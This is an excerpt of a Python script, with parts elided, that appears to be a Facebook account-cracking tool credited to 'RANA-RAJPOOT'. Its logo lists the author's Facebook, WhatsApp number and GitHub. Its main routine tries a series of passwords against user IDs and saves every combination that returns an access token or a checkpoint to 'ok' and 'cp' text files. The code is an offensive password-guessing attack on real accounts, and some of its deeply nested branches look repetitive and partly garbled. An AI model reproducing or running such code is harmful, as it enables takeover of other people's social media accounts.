...
logo = """
     \033[1;92m########:::::'###::::::::::'##:'########:::'#######:::'#######::'########:
      ...
      \033[1;92m..:::::..::..:::::..:::......:::..::::::::::.......::::.......::::::..:::::
\033[1;93m----------------------------------------------------------------------------------------------------------
 \033[1;93m(*)\033[1;92m Author: https://www.facebook.com/subhan.shahzad.52012
 \033[1;93m(*)\033[1;92m WhatsApp :   +994 40 930 28 19
 \033[1;93m(*)\033[1;92m Github   : https://github.com/RANA-RAJPOOT/R-J
\033[1;93m----------------------------------------------------------------------------------------------------------
"""
def tool():
	os.system("clear")
...
def crack_select():
	...
	if select =="1":
		...
		try:
			...
			print(logo)
			print('')
			print("  🔥 RANA-RAJPOOT🔥 START CRACKING.....")
			print('')
	...
	def main(arg):
		...
		try:
			...
			q = json.loads(data)
			if "access_token" in q:
				print(" \033[1;32m [RANA-RAJPOOT 😍-OK] "+uid+" | "+pass1+"\033[0;97m")
				ok = open("RANA-RAJPOOT 😍ok.txt", "a")
				ok.write(uid+"|"+pass1+"\n")
				ok.close()
				oks.append(uid+pass1)
			else:
				if "www.facebook.com" in q["error_msg"]:
					print(" \033[1;33m [RANA-RAJPOOT 😍-CP] "+uid+" | "+pass1+"\033[0;97m")
					cp = open("RANA-RAJPOOT 😍cp.txt", "a")
					cp.write(uid+"|"+pass1+"\n")
					cp.close()
					...
					q = json.loads(data)
					if "access_token" in q:
						print(" \033[1;32m [RANA-RAJPOOT🤭-OK] "+uid+" | "+pass2+"\033[0;97m")
						ok = open("RANA-RAJPOOT🤭ok.txt", "a")
						ok.write(uid+"|"+pass2+"\n")
						ok.close()
						...
						if "www.facebook.com" in q["error_msg"]:
							print(" \033[1;33m [RANA-RAJPOOT 😍-CP] "+uid+" | "+pass2+"\033[0;97m")
							cp = open("RANA-RAJPOOT 😍cp.txt", "a")
							cp.write(uid+"|"+pass2+"\n")
							cp.close()
							...
							q = json.loads(data)
							if "access_token" in q:
								print(" \033[1;32m [RANA-RAJPOOT😍-OK] "+uid+" | "+pass3+"\033[0;97m")
								ok = open("RANA-RAJPOOT 😍ok.txt", "a")
								ok.write(uid+"|"+pass3+"\n")
								ok.close()
								...
								if "www.facebook.com" in q["error_msg"]:
									print(" \033[1;33m [RANA-RAJPOOT 😍-CP] "+uid+" | "+pass3+"\033[0;97m")
									cp = open("RANA-RAJPOOT 😍cp.txt", "a")
									cp.write(uid+"|"+pass3+"\n")
									cp.close()
									...
									q = json.loads(data)
									if "access_token" in q:
										print(" \033[1;32m [RANA-RAJPOOT🤭OK] "+uid+" | "+pass4+"\033[0;97m")
										ok = open("RANA-RAJPOOT🤭ok.txt", "a")
										ok.write(uid+"|"+pass4+"\n")
										ok.close()
										...
										if "www.facebook.com" in q["error_msg"]:
											print(" \033[1;33m [RANA-RAJPOOT 😍-CP] "+uid+" | "+pass4+"\033[0;97m")
											cp = open("RANA-RAJPOOT 😍cp.txt", "a")
											cp.write(uid+"|"+pass4+"\n")
											cp.close()
											...
											q = json.loads(data)
											if "access_token" in q:
												print(" \033[1;32m [RANA-RAJPOOT🤭-OK] "+uid+" | "+pass5+"\033[0;97m")
												ok = open("RANA-RAJPOOT🤭ok.txt", "a")
												ok.write(uid+"|"+pass5+"\n")
												ok.close()
												...
												if "www.facebook.com" in q["error_msg"]:
													print(" \033[1;33m [RANA-RAJPOOT 😍-CP] "+uid+" | "+pass5+"\033[0;97m")
													cp = open("RANA-RAJPOOT 😍cp.txt", "a")
													cp.write(uid+"|"+pass5+"\n")
													cp.close()
													...
													q = json.loads(data)
													if "access_token" in q:
														print(" \033[1;32m [RANA-RAJPOOT🤭-OK] "+uid+" | "+pass6+"\033[0;97m")
														ok = open("RANA-RAJPOOT🤭ok.txt", "a")
														ok.write(uid+"|"+pass6+"\n")
														ok.close()
														...
														if "www.facebook.com" in q["error_msg"]:
															print(" \033[1;33m [RANA-RAJPOOT 😍-CP] "+uid+" | "+pass6+"\033[0;97m")
															cp = open("RANA-RAJPOOT 😍cp.txt", "a")
															cp.write(uid+"|"+pass6+"\n")
															cp.close()
															...
															q = json.loads(data)
															if "access_token" in q:
																print(" \033[1;32m [RANA-RAJPOOT🤭-OK] "+uid+" | "+pass7+"\033[0;97m")
																ok = open("RANA-RAJPOOT🤭ok.txt", "a")
																ok.write(uid+"|"+pass7+"\n")
																ok.close()
																...
																if "www.facebook.com" in q["error_msg"]:
																	print(" \033[1;33m [RANA-RAJPOOT 😍-CP] "+uid+" | "+pass7+"\033[0;97m")
																	cp = open("RANA-RAJPOOT 😍cp.txt", "a")
																	cp.write(uid+"|"+pass7+"\n")
																	cp.close()
											...
											if "access_token" in q:
												...
												if "www.facebook.com" in q["error_msg"]:
													...
													if "access_token" in q:
														...
														if "www.facebook.com" in q["error_msg"]:
															print(" \033[1;28m [RANA-RAJPOOT 😍-CP] "+uid+" | "+pass6+"\033[0;97m")
															cp = open("RANA-RAJPOOT 😍cp.txt", "a")
															cp.write(uid+"|"+pass6+"\n")
															cp.close()
															cps.append(uid+pass6)
